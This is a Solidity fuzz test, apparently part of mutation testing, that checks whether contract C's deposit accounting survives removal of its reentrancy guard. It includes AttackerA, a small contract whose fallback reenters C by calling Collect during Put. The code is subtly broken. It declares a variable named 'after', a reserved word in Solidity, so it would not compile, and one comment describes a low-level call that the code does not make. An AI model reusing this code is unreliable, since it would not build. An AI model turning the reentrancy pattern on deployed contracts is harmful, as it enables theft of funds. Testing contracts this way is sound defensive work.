pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;

    function setUp() public { c = new C(address(this)); }

    // fuzz parameters: attacker initialBalance (in wei) and an unlockTime
    function testFuzz_property(uint256 attackerInitialBalance, uint256 unlockTime) public {
        // keep amounts reasonable but wide
        attackerInitialBalance = bound(attackerInitialBalance, 1 wei, 1 ether);

        // Deploy an attacker that will reenter on receiving Ether
        AttackerA attacker = new AttackerA(c);

        // fund attacker so it can send the initial Put amount
        vm.deal(address(attacker), attackerInitialBalance);

        // record prior balance according to contract getter
        // Acc is public mapping; solidity auto getter: Acc(address) returns (uint unlockTime, uint balance)
        (, uint256 before) = c.Acc(address(attacker));

        // have attacker call Put with value; attacker will reenter during Put and try to exploit if possible
        attacker.attack{value: attackerInitialBalance}(unlockTime);

        // read recorded balance after Put returns
        (, uint256 after) = c.Acc(address(attacker));

        // GENERAL ASSERTION: the recorded balance after must equal before + sent value
        // This holds for the reference (nonReentrant_) for all inputs; the mutant (removed modifier)
        // can violate it via reentrancy, so this assert will fail for some inputs.
        assertTrue(after == before + attackerInitialBalance);
    }
}

// Minimal reentrancy-capable attacker: when receiving Ether during Put, it will call Collect on target
// to attempt to change its stored balance while Put is still executing. This exploits lack of nonReentrant_.
contract AttackerA {
    C public target;
    constructor(C _t) payable { target = _t; }

    // entrypoint to start the scenario: call Put on target with this contract as caller
    function attack(uint256 _unlockTime) public payable {
        // call Put on target, sending the ETH we have
        // Use low-level call through this contract to ensure msg.sender at C is address(this)
        target.Put{value: msg.value}(_unlockTime);
    }

    // fallback will be invoked if target sends Ether to this contract during its Put execution
    // In fallback, attempt to call Collect to remove funds from our account in target while Put is still running
    fallback() external payable {
        // try to collect a small amount (1 wei) - if Collect succeeds it will modify the recorded balance
        try target.Collect{value: 0}(1) {
            // ignore success
        } catch {
            // ignore revert
        }
    }
}

